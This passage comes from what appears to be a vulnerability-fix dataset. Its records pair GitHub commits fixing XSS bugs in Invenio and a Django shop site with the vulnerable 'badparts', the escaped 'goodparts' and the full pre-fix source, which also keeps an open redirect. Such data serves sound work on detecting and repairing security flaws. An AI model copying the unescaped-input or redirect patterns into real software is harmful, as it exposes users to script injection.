res.get_data(as_text=True) res=client.post( delete_view_url, data={'id': rec_uuid}, follow_redirects=True) assert res.status_code==200 ", "sourceWithComments": "# -*- coding: utf-8 -*-\n#\n# This file is part of Invenio.\n# Copyright (C) 2015-2018 CERN.\n#\n# Invenio is free software; you can redistribute it and/or modify it\n# under the terms of the MIT License; see LICENSE file for more details.\n\n\"\"\"Test admin interface.\"\"\"\n\nfrom __future__ import absolute_import, print_function\n\nimport uuid\n\nfrom flask import url_for\nfrom flask_admin import Admin, menu\nfrom mock import patch\nfrom sqlalchemy.exc import SQLAlchemyError\n\nfrom invenio_records.admin import record_adminview\nfrom invenio_records.api import Record\n\n\ndef test_admin(app, db):\n    \"\"\"Test flask-admin interace.\"\"\"\n    admin = Admin(app, name=\"Test\")\n\n    assert 'model' in record_adminview\n    assert 'modelview' in record_adminview\n\n    # Register both models in admin\n    model = record_adminview.pop('model')\n    view = record_adminview.pop('modelview')\n    admin.add_view(view(model, db.session, **record_adminview))\n\n    # Check if generated admin menu contains the correct items\n    menu_items = {str(item.name): item for item in admin.menu()}\n    assert 'Records' in menu_items\n    assert menu_items['Records'].is_category()\n\n    submenu_items = {\n        str(item.name): item for item in menu_items['Records'].get_children()}\n    assert 'Record Metadata' in submenu_items\n    assert isinstance(submenu_items['Record Metadata'], menu.MenuView)\n\n    # Create a test record.\n    rec_uuid = str(uuid.uuid4())\n    Record.create({'title': 'test'}, id_=rec_uuid)\n    db.session.commit()\n\n    with app.test_request_context():\n        index_view_url = url_for('recordmetadata.index_view')\n        delete_view_url = url_for('recordmetadata.delete_view')\n        detail_view_url = url_for(\n            'recordmetadata.details_view', id=rec_uuid)\n\n    with app.test_client() as client:\n        # List index view and check record is there.\n        res = client.get(index_view_url)\n        assert res.status_code == 200\n\n        # Fake a problem with SQLAlchemy.\n        with patch('invenio_records.models.RecordMetadata') as db_mock:\n            db_mock.side_effect = SQLAlchemyError()\n            res = client.post(\n                delete_view_url, data={'id': rec_uuid}, follow_redirects=True)\n            assert res.status_code == 200\n\n        # Delete it.\n        res = client.post(\n            delete_view_url, data={'id': rec_uuid}, follow_redirects=True)\n        assert res.status_code == 200\n\n        # View the delete record\n        res = client.get(detail_view_url)\n        assert res.status_code == 200\n        assert '<pre>null</pre>' in res.get_data(as_text=True)\n\n        # Delete it again\n        res = client.post(\n            delete_view_url, data={'id': rec_uuid}, follow_redirects=True)\n        assert res.status_code == 200\n"}}, "msg": "admin: xss vulnerability fix\n\n* Fixes a XSS vulnerability due to improperly escaped JSON output\n  of the record."}}, "https://github.com/Technikradio/C3FOCSite": {"6e330d4d44bbfdfce9993dffea97008276771600": {"url": "https://api.github.com/repos/Technikradio/C3FOCSite/commits/6e330d4d44bbfdfce9993dffea97008276771600", "html_url": "https://github.com/Technikradio/C3FOCSite/commit/6e330d4d44bbfdfce9993dffea97008276771600", "message": "fix: XSS bug in now exposed user forms", "sha": "6e330d4d44bbfdfce9993dffea97008276771600", "keyword": "XSS fix", "diff": "diff --git a/c3shop/frontpage/management/edit_user.py b/c3shop/frontpage/management/edit_user.py\nindex d5a51e6..3ad9ea2 100644\n--- a/c3shop/frontpage/management/edit_user.py\n+++ b/c3shop/frontpage/management/edit_user.py\n@@ -1,4 +1,5 @@\n from django.http import HttpRequest, HttpResponseForbidden, HttpResponseBadRequest\n+from django.utils.html import escape\n from django.shortcuts import redirect\n from django.contrib.auth.models import User\n from . import page_skeleton, magic\n@@ -127,9 +128,9 @@ def action_save_user(request: HttpRequest, default_forward_url: str = \"/admin/us\n             mail = str(request.POST[\"email\"])\n             rights = int(request.POST[\"rights\"])\n             user: Profile = Profile.objects.get(pk=pid)\n-            user.displayName = displayname\n+            user.displayName = escape(displayname)\n             user.dect = dect\n-            user.notes = notes\n+            user.notes = escape(notes)\n             user.rights = rights\n             user.number_of_allowed_reservations = int(request.POST[\"allowed_reservations\"])\n             if request.POST.get(\"active\"):\n@@ -140,7 +141,7 @@ def action_save_user(request: HttpRequest, default_forward_url: str = \"/admin/us\n                 au.set_password(pw1)\n             else:\n                 logging.log(logging.INFO, \"Failed to set password for: \" + user.displayName)\n-            au.email = mail\n+            au.email = escape(mail)\n             au.save()\n             user.save()\n         else:\n@@ -155,15 +156,15 @@ def action_save_user(request: HttpRequest, default_forward_url: str = \"/admin/us\n             rights = int(request.POST[\"rights\"])\n             if not check_password_conformity(pw1, pw2):\n                 recreate_form('password mismatch')\n-            auth_user: User = User.objects.create_user(username=username, email=mail, password=pw1)\n+            auth_user: User = User.objects.create_user(username=escape(username), email=escape(mail), password=pw1)\n             auth_user.save()\n             user: Profile = Profile()\n             user.rights = rights\n             user.number_of_allowed_reservations = int(request.POST[\"allowed_reservations\"])\n-            user.displayName = displayname\n+            user.displayName = escape(displayname)\n             user.authuser = auth_user\n             user.dect = dect\n-            user.notes = notes\n+            user.notes = escape(notes)\n             user.active = True\n             user.save()\n             pass\ndiff --git a/c3shop/frontpage/management/mediatools/media_actions.py b/c3shop/frontpage/management/mediatools/media_actions.py\nindex fd72927..728cd7c 100644\n--- a/c3shop/frontpage/management/mediatools/media_actions.py\n+++ b/c3shop/frontpage/management/mediatools/media_actions.py\n@@ -1,6 +1,7 @@\n from datetime import date, time\n from django.shortcuts import redirect\n from django.http import HttpRequest, HttpResponseBadRequest\n+from django.utils.html import escape\n from frontpage.models import Profile, Media, MediaUpload\n from frontpage.management.magic import compile_markdown, get_current_user\n \n@@ -52,12 +53,12 @@ def handle_file(u: Profile, headline: str, category: str, text: str, file):\n     height *= IMAGE_SCALE\n     cropped = original.resize((int(width), int(height)), PIL.Image.LANCZOS)\n     cropped.save(low_res_file_name)\n-    m.text = text\n-    m.cachedText = compile_markdown(text)\n-    m.category = category\n+    m.text = escape(text)\n+    m.cachedText = compile_markdown(escape(text))\n+    m.category = escape(category)\n     m.highResFile = \"/\" + high_res_file_name\n     m.lowResFile = \"/\" + low_res_file_name\n-    m.headline = headline\n+    m.headline = escape(headline)\n     m.save()\n     mu: MediaUpload = MediaUpload()\n     mu.UID = u\ndiff --git a/c3shop/frontpage/management/reservation_actions.py b/c3shop/frontpage/management/reservation_actions.py\nindex 4015d47..f0fe34f 100644\n--- a/c3shop/frontpage/management/reservation_actions.py\n+++ b/c3shop/frontpage/management/reservation_actions.py\n@@ -1,4 +1,5 @@\n from django.http import HttpRequest, HttpResponseRedirect\n+from django.utils.html import escape\n # from django.shortcuts import redirect\n from ..models import GroupReservation, ArticleRequested, Article, ArticleGroup, SubReservation\n from .magic import get_current_user\n@@ -40,7 +41,7 @@ def add_article_action(request: HttpRequest, default_foreward_url: str):\n         # Actual adding of article\n         aid: int = int(request.GET.get(\"article_id\"))\n         quantity: int = int(request.POST[\"quantity\"])\n-        notes: str = request.POST[\"notes\"]\n+        notes: str = escape(request.POST[\"notes\"])\n         ar = ArticleRequested()\n         ar.AID = Article.objects.get(id=aid)\n         ar.RID = current_reservation\n@@ -65,7 +66,7 @@ def add_article_action(request: HttpRequest, default_foreward_url: str):\n                 ar.amount = amount\n                 if \"srid\" in request.GET:\n                     ar.SRID = SubReservation.objects.get(id=int(request.GET[\"srid\"]))\n-                ar.notes = str(request.POST[str(\"notes_\" + str(art.id))])\n+                ar.notes = escape(str(request.POST[str(\"notes_\" + str(art.id))]))\n                 ar.save()\n     if \"srid\" in request.GET:\n         response = HttpResponseRedirect(forward_url + \"?rid=\" + str(current_reservation.id) + \"&srid=\" + request.GET[\"srid\"])\n@@ -116,7 +117,7 @@ def manipulate_reservation_action(request: HttpRequest, default_foreward_url: st\n         else:\n             sr = SubReservation.objects.get(id=srid)\n         if request.POST.get(\"notes\"):\n-            sr.notes = request.POST[\"notes\"]\n+            sr.notes = escape(request.POST[\"notes\"])\n         else:\n             sr.notes = \" \"\n         sr.primary_reservation = GroupReservation.objects.get(id=int(request.GET[\"rid\"]))\n@@ -136,9 +137,9 @@ def manipulate_reservation_action(request: HttpRequest, default_foreward_url: st\n     else:\n         return HttpResponseRedirect(\"/admin?error=Too%20Many%20reservations\")\n     if request.POST.get(\"notes\"):\n-        r.notes = request.POST[\"notes\"]\n+        r.notes = escape(request.POST[\"notes\"])\n     if request.POST.get(\"contact\"):\n-        r.responsiblePerson = str(request.POST[\"contact\"])\n+        r.responsiblePerson = escape(str(request.POST[\"contact\"]))\n     if (r.createdByUser == u or o.rights > 1) and not r.submitted:\n         r.save()\n     else:\n", "files": {"/c3shop/frontpage/management/edit_user.py": {"changes": [{"diff": "\n             mail = str(request.POST[\"email\"])\n             rights = int(request.POST[\"rights\"])\n             user: Profile = Profile.objects.get(pk=pid)\n-            user.displayName = displayname\n+            user.displayName = escape(displayname)\n             user.dect = dect\n-            user.notes = notes\n+            user.notes = escape(notes)\n             user.rights = rights\n             user.number_of_allowed_reservations = int(request.POST[\"allowed_reservations\"])\n             if request.POST.get(\"active\"):\n", "add": 2, "remove": 2, "filename": "/c3shop/frontpage/management/edit_user.py", "badparts": ["            user.displayName = displayname", "            user.notes = notes"], "goodparts": ["            user.displayName = escape(displayname)", "            user.notes = escape(notes)"]}, {"diff": "\n                 au.set_password(pw1)\n             else:\n                 logging.log(logging.INFO, \"Failed to set password for: \" + user.displayName)\n-            au.email = mail\n+            au.email = escape(mail)\n             au.save()\n             user.save()\n         else:\n", "add": 1, "remove": 1, "filename": "/c3shop/frontpage/management/edit_user.py", "badparts": ["            au.email = mail"], "goodparts": ["            au.email = escape(mail)"]}, {"diff": "\n             rights = int(request.POST[\"rights\"])\n             if not check_password_conformity(pw1, pw2):\n                 recreate_form('password mismatch')\n-            auth_user: User = User.objects.create_user(username=username, email=mail, password=pw1)\n+            auth_user: User = User.objects.create_user(username=escape(username), email=escape(mail), password=pw1)\n             auth_user.save()\n             user: Profile = Profile()\n             user.rights = rights\n             user.number_of_allowed_reservations = int(request.POST[\"allowed_reservations\"])\n-            user.displayName = displayname\n+            user.displayName = escape(displayname)\n             user.authuser = auth_user\n             user.dect = dect\n-            user.notes = notes\n+            user.notes = escape(notes)\n             user.active = True\n             user.save()\n             pass", "add": 3, "remove": 3, "filename": "/c3shop/frontpage/management/edit_user.py", "badparts": ["            auth_user: User = User.objects.create_user(username=username, email=mail, password=pw1)", "            user.displayName = displayname", "            user.notes = notes"], "goodparts": ["            auth_user: User = User.objects.create_user(username=escape(username), email=escape(mail), password=pw1)", "            user.displayName = escape(displayname)", "            user.notes = escape(notes)"]}], "source": "\nfrom django.http import HttpRequest, HttpResponseForbidden, HttpResponseBadRequest from django.shortcuts import redirect from django.contrib.auth.models import User from. import page_skeleton, magic from.form import Form, TextField, PlainText, TextArea, SubmitButton, NumberField, PasswordField, CheckBox, CheckEnum from..models import Profile, Media from..uitools.dataforge import get_csrf_form_element from.magic import get_current_user import logging def render_edit_page(http_request: HttpRequest, action_url: str): user_id=None profile: Profile=None if http_request.GET.get(\"user_id\"): user_id=int(http_request.GET[\"user_id\"]) if user_id is not None: profile=Profile.objects.get(pk=user_id) f=Form() f.action_url=action_url if profile: f.add_content(PlainText('<h3>Edit user \"' +profile.authuser.username +'\"</h3>')) f.add_content(PlainText('<a href=\"/admin/media/select?action_url=/admin/actions/change-user-avatar' '&payload=' +str(user_id) +'\"><img class=\"button-img\" alt=\"Change avatar\" ' 'src=\"/staticfiles/frontpage/change-avatar.png\"/></a><br />')) else: f.add_content(PlainText('<h3>Add new user</h3>')) if not profile: f.add_content(PlainText(\"username(can't be edited later on): \")) f.add_content(TextField(name='username')) if http_request.GET.get('fault') and profile: f.add_content(PlainText(\"Unable to edit user due to: \" +str(http_request.GET['fault']))) elif http_request.GET.get('fault'): f.add_content(PlainText(\"Unable to add user due to: \" +str(http_request.GET['fault']))) current_user: Profile=get_current_user(http_request) if current_user.rights > 3: if not profile: f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=CheckEnum.CHECKED)) else: m: CheckEnum=CheckEnum.CHECKED if not profile.active: m=CheckEnum.NOT_CHECKED f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=m)) if profile: f.add_content(PlainText(\"Email address: \")) f.add_content(TextField(name='email', button_text=str(profile.authuser.email))) f.add_content(PlainText(\"Display name: \")) f.add_content(TextField(name='display_name', button_text=profile.displayName)) f.add_content(PlainText('DECT: ')) f.add_content(NumberField(name='dect', button_text=str(profile.dect), minimum=0)) f.add_content(PlainText('Number of allowed reservations: ')) f.add_content(NumberField(name='allowed_reservations', button_text=str(profile.number_of_allowed_reservations), minimum=0)) f.add_content(PlainText(\"Rights: \")) f.add_content(NumberField(name=\"rights\", button_text=str(profile.rights), minimum=0, maximum=4)) f.add_content(PlainText('Notes:<br/>')) f.add_content(TextArea(name='notes', text=str(profile.notes))) else: f.add_content(PlainText(\"Email address: \")) f.add_content(TextField(name='email')) f.add_content(PlainText(\"Display name: \")) f.add_content(TextField(name='display_name')) f.add_content(PlainText('DECT: ')) f.add_content(NumberField(name='dect', minimum=0)) f.add_content(PlainText('Number of allowed reservations: ')) f.add_content(NumberField(name='allowed_reservations', button_text=str(1), minimum=0)) f.add_content(PlainText(\"Rights: \")) f.add_content(NumberField(name=\"rights\", button_text=str(0), minimum=0, maximum=4)) f.add_content(PlainText('Notes:<br/>')) f.add_content(TextArea(name='notes', placeholder=\"Hier k\u00f6nnte ihre Werbung stehen\")) if profile: f.add_content(PlainText('<br /><br />Change password(leave blank in order to not change it):')) else: f.add_content(PlainText('<br />Choose a password: ')) f.add_content(PasswordField(name='password', required=False)) f.add_content(PlainText('Confirm your password: ')) f.add_content(PasswordField(name='confirm_password', required=False)) f.add_content(PlainText(get_csrf_form_element(http_request))) f.add_content(SubmitButton()) a='<div class=\"w3-row w3-padding-64 w3-twothird w3-container admin-popup\">' a +=f.render_html(http_request) a +=\"</div>\" return a def check_password_conformity(pw1: str, pw2: str): if not(pw1==pw2): return False if len(pw1) < 6: return False if pw1.isupper(): return False if pw1.islower(): return False return True def recreate_form(reason: str): return redirect('/admin/users/edit?fault=' +str(reason)) def action_save_user(request: HttpRequest, default_forward_url: str=\"/admin/users\"): \"\"\" This functions saves the changes to the user or adds a new one. It completely creates the HttpResponse :param request: the HttpRequest :param default_forward_url: The URL to forward to if nothing was specified :return: The crafted HttpResponse \"\"\" forward_url=default_forward_url if request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] if not request.user.is_authenticated: return HttpResponseForbidden() profile=Profile.objects.get(authuser=request.user) if profile.rights < 2: return HttpResponseForbidden() try: if request.GET.get(\"user_id\"): pid=int(request.GET[\"user_id\"]) displayname=str(request.POST[\"display_name\"]) dect=int(request.POST[\"dect\"]) notes=str(request.POST[\"notes\"]) pw1=str(request.POST[\"password\"]) pw2=str(request.POST[\"confirm_password\"]) mail=str(request.POST[\"email\"]) rights=int(request.POST[\"rights\"]) user: Profile=Profile.objects.get(pk=pid) user.displayName=displayname user.dect=dect user.notes=notes user.rights=rights user.number_of_allowed_reservations=int(request.POST[\"allowed_reservations\"]) if request.POST.get(\"active\"): user.active=magic.parse_bool(request.POST[\"active\"]) au: User=user.authuser if check_password_conformity(pw1, pw2): logging.log(logging.INFO, \"Set password for user: \" +user.displayName) au.set_password(pw1) else: logging.log(logging.INFO, \"Failed to set password for: \" +user.displayName) au.email=mail au.save() user.save() else: username=str(request.POST[\"username\"]) displayname=str(request.POST[\"display_name\"]) dect=int(request.POST[\"dect\"]) notes=str(request.POST[\"notes\"]) pw1=str(request.POST[\"password\"]) pw2=str(request.POST[\"confirm_password\"]) mail=str(request.POST[\"email\"]) rights=int(request.POST[\"rights\"]) if not check_password_conformity(pw1, pw2): recreate_form('password mismatch') auth_user: User=User.objects.create_user(username=username, email=mail, password=pw1) auth_user.save() user: Profile=Profile() user.rights=rights user.number_of_allowed_reservations=int(request.POST[\"allowed_reservations\"]) user.displayName=displayname user.authuser=auth_user user.dect=dect user.notes=notes user.active=True user.save() pass pass except Exception as e: return HttpResponseBadRequest(str(e)) return redirect(forward_url) ", "sourceWithComments": "from django.http import HttpRequest, HttpResponseForbidden, HttpResponseBadRequest\nfrom django.shortcuts import redirect\nfrom django.contrib.auth.models import User\nfrom . import page_skeleton, magic\nfrom .form import Form, TextField, PlainText, TextArea, SubmitButton, NumberField, PasswordField, CheckBox, CheckEnum\nfrom ..models import Profile, Media\nfrom ..uitools.dataforge import get_csrf_form_element\nfrom .magic import get_current_user\nimport logging\n\n\ndef render_edit_page(http_request: HttpRequest, action_url: str):\n\n    user_id = None\n    profile: Profile = None\n    if http_request.GET.get(\"user_id\"):\n        user_id = int(http_request.GET[\"user_id\"])\n    if user_id is not None:\n        profile = Profile.objects.get(pk=user_id)\n    f = Form()\n    f.action_url = action_url\n    if profile:\n        f.add_content(PlainText('<h3>Edit user \"' + profile.authuser.username + '\"</h3>'))\n        f.add_content(PlainText('<a href=\"/admin/media/select?action_url=/admin/actions/change-user-avatar'\n                                '&payload=' + str(user_id) + '\"><img class=\"button-img\" alt=\"Change avatar\" '\n                                'src=\"/staticfiles/frontpage/change-avatar.png\"/></a><br />'))\n    else:\n        f.add_content(PlainText('<h3>Add new user</h3>'))\n    if not profile:\n        f.add_content(PlainText(\"username (can't be edited later on): \"))\n        f.add_content(TextField(name='username'))\n    if http_request.GET.get('fault') and profile:\n        f.add_content(PlainText(\"Unable to edit user due to: \" + str(http_request.GET['fault'])))\n    elif http_request.GET.get('fault'):\n        f.add_content(PlainText(\"Unable to add user due to: \" + str(http_request.GET['fault'])))\n    current_user: Profile = get_current_user(http_request)\n    if current_user.rights > 3:\n        if not profile:\n            f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=CheckEnum.CHECKED))\n        else:\n            m: CheckEnum = CheckEnum.CHECKED\n            if not profile.active:\n                m = CheckEnum.NOT_CHECKED\n            f.add_content(CheckBox(name=\"active\", text=\"User Active\", checked=m))\n    if profile:\n        f.add_content(PlainText(\"Email address: \"))\n        f.add_content(TextField(name='email', button_text=str(profile.authuser.email)))\n        f.add_content(PlainText(\"Display name: \"))\n        f.add_content(TextField(name='display_name', button_text=profile.displayName))\n        f.add_content(PlainText('DECT: '))\n        f.add_content(NumberField(name='dect', button_text=str(profile.dect), minimum=0))\n        f.add_content(PlainText('Number of allowed reservations: '))\n        f.add_content(NumberField(name='allowed_reservations', button_text=str(profile.number_of_allowed_reservations), minimum=0))\n        f.add_content(PlainText(\"Rights: \"))\n        f.add_content(NumberField(name=\"rights\", button_text=str(profile.rights), minimum=0, maximum=4))\n        f.add_content(PlainText('Notes:<br/>'))\n        f.add_content(TextArea(name='notes', text=str(profile.notes)))\n    else:\n        f.add_content(PlainText(\"Email address: \"))\n        f.add_content(TextField(name='email'))\n        f.add_content(PlainText(\"Display name: \"))\n        f.add_content(TextField(name='display_name'))\n        f.add_content(PlainText('DECT: '))\n        f.add_content(NumberField(name='dect', minimum=0))\n        f.add_content(PlainText('Number of allowed reservations: '))\n        f.add_content(NumberField(name='allowed_reservations', button_text=str(1), minimum=0))\n        f.add_content(PlainText(\"Rights: \"))\n        f.add_content(NumberField(name=\"rights\", button_text=str(0), minimum=0, maximum=4))\n        f.add_content(PlainText('Notes:<br/>'))\n        f.add_content(TextArea(name='notes', placeholder=\"Hier k\u00f6nnte ihre Werbung stehen\"))\n    if profile:\n        f.add_content(PlainText('<br /><br />Change password (leave blank in order to not change it):'))\n    else:\n        f.add_content(PlainText('<br />Choose a password: '))\n    f.add_content(PasswordField(name='password', required=False))\n    f.add_content(PlainText('Confirm your password: '))\n    f.add_content(PasswordField(name='confirm_password', required=False))\n    f.add_content(PlainText(get_csrf_form_element(http_request)))\n    f.add_content(SubmitButton())\n    # a = page_skeleton.render_headbar(http_request, \"Edit User\")\n    a = '<div class=\"w3-row w3-padding-64 w3-twothird w3-container admin-popup\">'\n    a += f.render_html(http_request)\n    # a += page_skeleton.render_footer(http_request)\n    a += \"</div>\"\n    return a\n\n\ndef check_password_conformity(pw1: str, pw2: str):\n    if not (pw1 == pw2):\n        return False\n    if len(pw1) < 6:\n        return False\n    if pw1.isupper():\n        return False\n    if pw1.islower():\n        return False\n    return True\n\n\ndef recreate_form(reason: str):\n    return redirect('/admin/users/edit?fault=' + str(reason))\n\n\ndef action_save_user(request: HttpRequest, default_forward_url: str = \"/admin/users\"):\n    \"\"\"\n    This functions saves the changes to the user or adds a new one. It completely creates the HttpResponse\n    :param request: the HttpRequest\n    :param default_forward_url: The URL to forward to if nothing was specified\n    :return: The crafted HttpResponse\n    \"\"\"\n    forward_url = default_forward_url\n    if request.GET.get(\"redirect\"):\n        forward_url = request.GET[\"redirect\"]\n    if not request.user.is_authenticated:\n        return HttpResponseForbidden()\n    profile = Profile.objects.get(authuser=request.user)\n    if profile.rights < 2:\n        return HttpResponseForbidden()\n    try:\n        if request.GET.get(\"user_id\"):\n            pid = int(request.GET[\"user_id\"])\n            displayname = str(request.POST[\"display_name\"])\n            dect = int(request.POST[\"dect\"])\n            notes = str(request.POST[\"notes\"])\n            pw1 = str(request.POST[\"password\"])\n            pw2 = str(request.POST[\"confirm_password\"])\n            mail = str(request.POST[\"email\"])\n            rights = int(request.POST[\"rights\"])\n            user: Profile = Profile.objects.get(pk=pid)\n            user.displayName = displayname\n            user.dect = dect\n            user.notes = notes\n            user.rights = rights\n            user.number_of_allowed_reservations = int(request.POST[\"allowed_reservations\"])\n            if request.POST.get(\"active\"):\n                user.active = magic.parse_bool(request.POST[\"active\"])\n            au: User = user.authuser\n            if check_password_conformity(pw1, pw2):\n                logging.log(logging.INFO, \"Set password for user: \" + user.displayName)\n                au.set_password(pw1)\n            else:\n                logging.log(logging.INFO, \"Failed to set password for: \" + user.displayName)\n            au.email = mail\n            au.save()\n            user.save()\n        else:\n            # assume new user\n            username = str(request.POST[\"username\"])\n            displayname = str(request.POST[\"display_name\"])\n            dect = int(request.POST[\"dect\"])\n            notes = str(request.POST[\"notes\"])\n            pw1 = str(request.POST[\"password\"])\n            pw2 = str(request.POST[\"confirm_password\"])\n            mail = str(request.POST[\"email\"])\n            rights = int(request.POST[\"rights\"])\n            if not check_password_conformity(pw1, pw2):\n                recreate_form('password mismatch')\n            auth_user: User = User.objects.create_user(username=username, email=mail, password=pw1)\n            auth_user.save()\n            user: Profile = Profile()\n            user.rights = rights\n            user.number_of_allowed_reservations = int(request.POST[\"allowed_reservations\"])\n            user.displayName = displayname\n            user.authuser = auth_user\n            user.dect = dect\n            user.notes = notes\n            user.active = True\n            user.save()\n            pass\n        pass\n    except Exception as e:\n        return HttpResponseBadRequest(str(e))\n    return redirect(forward_url)\n"}, "/c3shop/frontpage/management/mediatools/media_actions.py": {"changes": [{"diff": "\n     height *= IMAGE_SCALE\n     cropped = original.resize((int(width), int(height)), PIL.Image.LANCZOS)\n     cropped.save(low_res_file_name)\n-    m.text = text\n-    m.cachedText = compile_markdown(text)\n-    m.category = category\n+    m.text = escape(text)\n+    m.cachedText = compile_markdown(escape(text))\n+    m.category = escape(category)\n     m.highResFile = \"/\" + high_res_file_name\n     m.lowResFile = \"/\" + low_res_file_name\n-    m.headline = headline\n+    m.headline = escape(headline)\n     m.save()\n     mu: MediaUpload = MediaUpload()\n     mu.UID = ", "add": 4, "remove": 4, "filename": "/c3shop/frontpage/management/mediatools/media_actions.py", "badparts": ["    m.text = text", "    m.cachedText = compile_markdown(text)", "    m.category = category", "    m.headline = headline"], "goodparts": ["    m.text = escape(text)", "    m.cachedText = compile_markdown(escape(text))", "    m.category = escape(category)", "    m.headline = escape(headline)"]}], "source": "\nfrom datetime import date, time from django.shortcuts import redirect from django.http import HttpRequest, HttpResponseBadRequest from frontpage.models import Profile, Media, MediaUpload from frontpage.management.magic import compile_markdown, get_current_user import logging import ntpath import os import math import PIL from PIL import Image PATH_TO_UPLOAD_FOLDER_ON_DISK: str=\"/usr/local/www/focweb/\" IMAGE_SCALE=64 def action_change_user_avatar(request: HttpRequest): try: user_id=int(request.GET[\"payload\"]) media_id=int(request.GET[\"media_id\"]) user: Profile=Profile.objects.get(pk=int(user_id)) u: Profile=get_current_user(request) if not(u==user) and u.rights < 4: return redirect(\"/admin?error='You're not allowed to edit other users.'\") medium=Media.objects.get(pk=int(media_id)) user.avatarMedia=medium user.save() except Exception as e: return redirect(\"/admin?error=\" +str(e)) return redirect(\"/admin/users\") def handle_file(u: Profile, headline: str, category: str, text: str, file): m: Media=Media() upload_base_path: str='uploads/' +str(date.today().year) high_res_file_name=upload_base_path +'/HIGHRES_' +ntpath.basename(file.name.replace(\" \", \"_\")) low_res_file_name=upload_base_path +'/LOWRES_' +ntpath.basename(file.name.replace(\" \", \"_\")) if not os.path.exists(PATH_TO_UPLOAD_FOLDER_ON_DISK +upload_base_path): os.makedirs(PATH_TO_UPLOAD_FOLDER_ON_DISK +upload_base_path) with open(high_res_file_name, 'wb+') as destination: for chunk in file.chunks(): destination.write(chunk) original=Image.open(high_res_file_name) width, height=original.size diameter=math.sqrt(math.pow(width, 2) +math.pow(height, 2)) width /=diameter height /=diameter width *=IMAGE_SCALE height *=IMAGE_SCALE cropped=original.resize((int(width), int(height)), PIL.Image.LANCZOS) cropped.save(low_res_file_name) m.text=text m.cachedText=compile_markdown(text) m.category=category m.highResFile=\"/\" +high_res_file_name m.lowResFile=\"/\" +low_res_file_name m.headline=headline m.save() mu: MediaUpload=MediaUpload() mu.UID=u mu.MID=m mu.save() logging.info(\"Uploaded file '\" +str(file.name) +\"' and cropped it. The resulting PK is \" +str(m.pk)) def action_add_single_media(request: HttpRequest): try: headline=request.POST[\"headline\"] category=request.POST[\"category\"] text=request.POST[\"text\"] file=request.FILES['file'] user: Profile=get_current_user(request) handle_file(user, headline, category, text, file) except Exception as e: return redirect(\"/admin/media/add?hint=\" +str(e)) return redirect(\"/admin/media/add\") def action_add_multiple_media(request: HttpRequest): try: category: str=request.POST[\"category\"] files=request.FILES.getlist('files') user: Profile=get_current_user(request) for f in files: handle_file(user, str(f.name), category, \" except Exception as e: return redirect(\"/admin/media/add?hint=\" +str(e)) return redirect(\"/admin/media/add\") ", "sourceWithComments": "from datetime import date, time\nfrom django.shortcuts import redirect\nfrom django.http import HttpRequest, HttpResponseBadRequest\nfrom frontpage.models import Profile, Media, MediaUpload\nfrom frontpage.management.magic import compile_markdown, get_current_user\n\nimport logging\nimport ntpath\nimport os\nimport math\nimport PIL\nfrom PIL import Image\n\n\nPATH_TO_UPLOAD_FOLDER_ON_DISK: str = \"/usr/local/www/focweb/\"\nIMAGE_SCALE = 64\n\n\ndef action_change_user_avatar(request: HttpRequest):\n    try:\n        user_id = int(request.GET[\"payload\"])\n        media_id = int(request.GET[\"media_id\"])\n        user: Profile = Profile.objects.get(pk=int(user_id))\n        u: Profile = get_current_user(request)\n        if not (u == user) and u.rights < 4:\n            return redirect(\"/admin?error='You're not allowed to edit other users.'\")\n        medium = Media.objects.get(pk=int(media_id))\n        user.avatarMedia = medium\n        user.save()\n    except Exception as e:\n        return redirect(\"/admin?error=\" + str(e))\n    return redirect(\"/admin/users\")\n\n\ndef handle_file(u: Profile, headline: str, category: str, text: str, file):\n    m: Media = Media()\n    upload_base_path: str = 'uploads/' + str(date.today().year)\n    high_res_file_name = upload_base_path + '/HIGHRES_' + ntpath.basename(file.name.replace(\" \", \"_\"))\n    low_res_file_name = upload_base_path + '/LOWRES_' + ntpath.basename(file.name.replace(\" \", \"_\"))\n    if not os.path.exists(PATH_TO_UPLOAD_FOLDER_ON_DISK + upload_base_path):\n        os.makedirs(PATH_TO_UPLOAD_FOLDER_ON_DISK + upload_base_path)\n    with open(high_res_file_name, 'wb+') as destination:\n        for chunk in file.chunks():\n            destination.write(chunk)\n    # TODO crop image\n    original = Image.open(high_res_file_name)\n    width, height = original.size\n    diameter = math.sqrt(math.pow(width, 2) + math.pow(height, 2))\n    width /= diameter\n    height /= diameter\n    width *= IMAGE_SCALE\n    height *= IMAGE_SCALE\n    cropped = original.resize((int(width), int(height)), PIL.Image.LANCZOS)\n    cropped.save(low_res_file_name)\n    m.text = text\n    m.cachedText = compile_markdown(text)\n    m.category = category\n    m.highResFile = \"/\" + high_res_file_name\n    m.lowResFile = \"/\" + low_res_file_name\n    m.headline = headline\n    m.save()\n    mu: MediaUpload = MediaUpload()\n    mu.UID = u\n    mu.MID = m\n    mu.save()\n    logging.info(\"Uploaded file '\" + str(file.name) + \"' and cropped it. The resulting PK is \" + str(m.pk))\n\n\ndef action_add_single_media(request: HttpRequest):\n    try:\n        headline = request.POST[\"headline\"]\n        category = request.POST[\"category\"]\n        text = request.POST[\"text\"]\n        file = request.FILES['file']\n        user: Profile = get_current_user(request)\n        handle_file(user, headline, category, text, file)\n    except Exception as e:\n        return redirect(\"/admin/media/add?hint=\" + str(e))\n    return redirect(\"/admin/media/add\")\n\n\ndef action_add_multiple_media(request: HttpRequest):\n    try:\n        category: str = request.POST[\"category\"]\n        files = request.FILES.getlist('files')\n        user: Profile = get_current_user(request)\n        for f in files:\n            handle_file(user, str(f.name), category, \"### There is no media description\", f)\n    except Exception as e:\n        return redirect(\"/admin/media/add?hint=\" + str(e))\n    return redirect(\"/admin/media/add\")\n"}, "/c3shop/frontpage/management/reservation_actions.py": {"changes": [{"diff": "\n         # Actual adding of article\n         aid: int = int(request.GET.get(\"article_id\"))\n         quantity: int = int(request.POST[\"quantity\"])\n-        notes: str = request.POST[\"notes\"]\n+        notes: str = escape(request.POST[\"notes\"])\n         ar = ArticleRequested()\n         ar.AID = Article.objects.get(id=aid)\n         ar.RID = current_reservation\n", "add": 1, "remove": 1, "filename": "/c3shop/frontpage/management/reservation_actions.py", "badparts": ["        notes: str = request.POST[\"notes\"]"], "goodparts": ["        notes: str = escape(request.POST[\"notes\"])"]}, {"diff": "\n                 ar.amount = amount\n                 if \"srid\" in request.GET:\n                     ar.SRID = 